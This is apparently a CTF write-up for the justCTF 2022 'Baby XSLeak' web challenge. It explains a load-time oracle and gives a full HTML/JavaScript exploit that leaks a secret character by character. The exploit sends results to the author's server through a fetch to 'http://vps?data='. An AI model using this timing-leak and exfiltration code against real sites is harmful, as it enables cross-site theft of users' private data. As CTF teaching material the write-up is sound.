---
title: justCTF 2022 - Baby XSLeak Write-up
date: 2022-06-14 20:43:37
tags: [Security]
categories: [Security]
---
<img src="/img/justctf-2022-xsleak-writeup/cover-en.png" style="display:none">

Last weekend, I played justCTF 2022 with my team [Water Paddler](https://ctftime.org/team/155019/), and we got 7th place!

It's the write-up about one of the XSleak challenges, an easier one. If you want to see the hard one, you can refer to this awesome writeup: [New technique of stealing data using CSS and Scroll-to-text Fragment feature](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/).

<!-- more -->

## About the challenge

It's a simple web service, and there are three endpoints:

1. /
2. /search
3. /debug

The core function is as below:

``` go
flagStr := os.Getenv("FLAG")
mux := http.NewServeMux()
mux.HandleFunc("/search/", func(w http.ResponseWriter, r *http.Request) {
  if !isPrivateIP(getIP(r)) {
    w.WriteHeader(http.StatusForbidden)
    return
  }
  handleSearch(w, r, flagStr)
})
mux.HandleFunc("/debug/", func(w http.ResponseWriter, r *http.Request) {
  handleSearch(w, r, "justCTF{fake_flags}")
})

func handleSearch(w http.ResponseWriter, r *http.Request, flag string) {
  query := r.URL.Query().Get("search")
  msg := r.URL.Query().Get("msg")

  if !strings.Contains(flag, query) {
    w.Write([]byte("Not found"))
  } else {
    w.Write(append([]byte(msg), flag...))
  }
}
```

You can pass two query strings `search` and `msg`, if `search` is in the flag, the server will return msg+flag, otherwise `Not Found`.

`/search` can only be accessed within the internal network via the bot, so they provide another `/debug` endpoint for the player to test.

For example, `/debug?search=NOT_EXIST&msg=hello` returns `Not found`,  and`/debug?search=justCTF&msg=hello` returns `hellojustCTF{fake_flags}`

We can use this difference to leak the flag char by char.

By the way, we can't do XSS  because of the headers:

```
w.Header().Set("X-Content-Type-Options", "nosniff")
w.Header().Set("Content-Security-Policy", "script-src 'none';")
w.Header().Set("Content-Type", "text/plain")
```

Also, [error events](https://xsleaks.dev/docs/attacks/error-events/) will not work because of `text/plain` content type.

## Oracle

What is the oracle to leak the flag?

We can use something like: `/search?search=a&msg=${'A'*1000000}`

If `a` is not in the flag, the response is just `Not Found`, otherwise A*1000000+flag

More content takes more time for the browser to render, so we can use the `<object>` tag to embed the URL and measure the load time, see the following for the actual code:

``` js
function leak(char, callback) {
  return new Promise(resolve => {
    let ss = 'just_random_string'
    // for msg, I use random string to avoid cache, but maybe it's not needed
    let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000)
    let start = performance.now()
    let object = document.createElement('object');
    object.width = '2000px'
    object.height = '2000px'
    object.data = url;
    object.onload = () => {
      object.remove()
      let end = performance.now()
      resolve(end - start)
    }
    object.onerror = () => console.log('Error event triggered');
    document.body.appendChild(object);
  })
  
}
```

Initially, I didn't set object width and height, but later on, I found that it's important because the default size is too small to make a difference in the load time.

## Exploit

Here is my exploit in the end:

``` html
<!DOCTYPE html>
<html>
<head>

</head>
<body>
  <img src="https://deelay.me/30000/https://example.com">
    <script>
      fetch('https://deelay.me/30000/https://example.com')

      function send(data) {
        fetch('http://vps?data='+encodeURIComponent(data)).catch(err => 1)
      }

      function leak(char, callback) {
        return new Promise(resolve => {
          let ss = 'just_random_string'
          let url = `http://baby-xsleak-ams3.web.jctf.pro/search/?search=${char}&msg=`+ss[Math.floor(Math.random()*ss.length)].repeat(1000000)
          let start = performance.now()
          let object = document.createElement('object');
          object.width = '2000px'
          object.height = '2000px'
          object.data = url;
          object.onload = () => {
            object.remove()
            let end = performance.now()
            resolve(end - start)
          }
          object.onerror = () => console.log('Error event triggered');
          document.body.appendChild(object);
        })
        
      }

      send('start')

      let charset = 'abcdefghijklmnopqrstuvwxyz_}'.split('')
      let flag = 'justCTF{'

      async function main() {
        let found = 0
        let notFound = 0
        for(let i=0;i<3;i++) {
          await leak('..')
        }
        for(let i=0; i<3; i++) {
          found += await leak('justCTF')
        }
        for(let i=0; i<3; i++) {
          notFound += await leak('NOT_FOUND123')
        }

        found /= 3
        notFound /= 3
        
        send('found flag:'+found)
        send('not found flag:'+notFound)

        let threshold = found - ((found - notFound)/2)
        send('threshold:'+threshold)

        if (notFound > found) {
          return
        }

        // exploit
        while(true) {
          if (flag[flag.length - 1] === '}') {
            break
          }
          for(let char of charset) {
            let trying = flag + char
            let time = 0
            for(let i=0; i<3; i++) {
              time += await leak(trying)
            }
            time/=3
            send('char:'+trying+',time:'+time)
            if (time >= threshold) {
              flag += char
              send(flag)
              break
            }
          }
        }
      }

      main()
      
    </script>
</body>

</html>
```

When exploiting the xsleak challenge, I need to send the log back to my server to know if anything is wrong.

For example, the threshold is sometimes inaccurate, so I need to update the exploit a few times manually.

Also, there are a few details to make the exploit faster and more stable. 

First, I send a few requests before measuring the load time. The first few requests are not that accurate due to DNS lookup, initial connection, etc.

Second, I send a request three times and take it's average to be more accurate(but the trade-off is that the exploit will take more time)

Third, you can leak the charset first to reduce the time and request significantly:

``` js
// leak charset
let charset = 'abcdefghijklmnopqrstuvwxyz_}'.split('')
let newCharset = ''
for(let char of charset) {
  let time = 0
  for(let i=0; i<3; i++) {
    time += await leak(char)
  }
  time/=3
  send('char:' + char + ',time:' + time)
  if (time >= thershold) {
    newCharset += char
    send(newCharset)
  }
}
```

I spent most of the time tweaking these details to get the expected result. Anyway, by running the exploit a few times, we can get the flag in the end: `justCTF{timeme__}`(IIRC, the server is off, and I forgot to take the screenshot)
